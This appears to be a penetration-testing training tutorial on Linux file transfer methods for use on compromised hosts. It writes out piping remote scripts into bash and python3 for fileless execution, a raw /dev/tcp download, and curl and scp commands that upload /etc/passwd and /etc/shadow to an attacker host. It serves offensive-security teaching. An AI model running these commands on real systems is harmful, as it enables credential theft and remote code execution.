# Linux File Transfer Methods

Linux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. Understanding file transfer methods in Linux can help attackers and defenders improve their skills to attack networks and prevent sophisticated attacks.

A few years ago, we were contacted to perform incident response on some web servers. We found multiple threat actors in six out of the nine web servers we investigated. The threat actor found a SQL Injection vulnerability. They used a Bash script that, when executed, attempted to download another piece of malware that connected to the threat actor's command and control server.

The Bash script they used tried three download methods to get the other piece of malware that connected to the command and control server. Its first attempt was to use cURL. If that failed, it attempted to use wget, and if that failed, it used Python. All three methods use HTTP to communicate.

Although Linux can communicate via FTP, SMB like Windows, most malware on all different operating systems uses HTTP and HTTPS for communication.

This section will review multiple ways to transfer files on Linux, including HTTP, Bash, SSH, etc


## Web Downloads with Wget and cURL

Two of the most common utilities in Linux distributions to interact with web applications are wget and curl. These tools are installed on many Linux distributions.

To download a file using wget, we need to specify the URL and the option '-O' to set the output filename.

`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`

cURL is very similar to wget, but the output filename option is lowercase '-o'.

`curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`

## Fileless Attacks Using Linux

Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

Note: Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload choosen it may create temporary files on the OS.

Let's take the cURL command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.

`curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`

Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using wget.

`wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`

## Download with Bash (/dev/tcp)

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

### Connect to the Target Webserver

`exec 3<>/dev/tcp/10.10.10.32/80`

### HTTP GET Request

`echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`

### Print the Response

`cat <&3`

## SSH Downloads

SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.

SCP (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.

SCP is very similar to copy or cp, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.

`scp plaintext@192.168.49.128:/root/myroot.txt .`

Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

## Upload Operations

There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.

## Web Upload

### Start Web Server

`python3 -m pip install --user uploadserver`

Now we need to create a certificate. In this example, we are using a self-signed certificate.

### Create a Self-Signed Certificate

`openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`

The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

- `mkdir https && cd https`

- `python3 -m uploadserver 443 --server-certificate /root/server.pem`

Now from our compromised machine, let's upload the /etc/passwd and /etc/shadow files.

## Linux - Upload Multiple Files

`curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`

We used the option --insecure because we used a self-signed certificate that we trust.

## Alternative Web File Transfer Method

Since Linux distributions usually have Python or php installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.

It is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.

### Creating a Web Server with Python3

`python3 -m http.server`

### Creating a Web Server with Python2.7

`python2.7 -m SimpleHTTPServer`

### Creating a Web Server with PHP

`php -S 0.0.0.0:8000`

### Creating a Web Server with Ruby

`ruby -run -ehttpd . -p8000`

## Download the File from the Target Machine onto the Pwnbox

`wget 192.168.49.128:8000/filetotransfer.txt`

Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.


## SCP Upload

We may find some companies that allow the SSH protocol (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the scp utility to upload files. Let's attempt to upload a file using the SSH protocol.

`scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/`

